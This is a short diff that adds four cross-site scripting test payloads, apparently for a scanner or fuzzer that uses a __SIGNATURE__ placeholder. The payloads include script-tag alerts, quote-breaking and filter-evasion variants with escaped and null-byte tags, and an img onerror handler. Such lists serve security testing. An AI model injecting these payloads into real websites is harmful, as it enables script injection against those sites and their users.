@@ -1,0 +1,4 @@
+<script>alert("__SIGNATURE__")</script>
+'`"><\x3Cscript>javascript:alert(__SIGNATURE__)</script>
+'`"><\x00script>javascript:alert(__SIGNATURE__)</script>
+<img src=1 href=1 onerror="javascript:alert(__SIGNATURE__)"></img>
